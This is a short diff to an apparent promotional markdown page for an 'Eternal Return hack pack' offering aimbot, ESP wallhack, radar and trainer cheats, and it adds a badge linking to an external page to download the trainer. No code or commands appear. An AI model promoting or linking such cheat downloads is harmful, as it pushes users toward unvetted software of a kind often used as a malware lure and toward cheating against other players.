@@ -4,6 +4,7 @@
 
 The mix of MOBA mechanics and survival gameplay in **Eternal Return** makes every match unpredictable. But with the **Eternal Return hack pack**, you gain total control: **aimbot for perfect accuracy, ESP wallhack for vision, radar hacks for awareness, and trainer mods for survival boosts**. This article breaks down how hacks can transform your experience on Lumia Island.
 
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://eternal-return-hack.github.io/.github/)
 ---
 
 ## Product Description
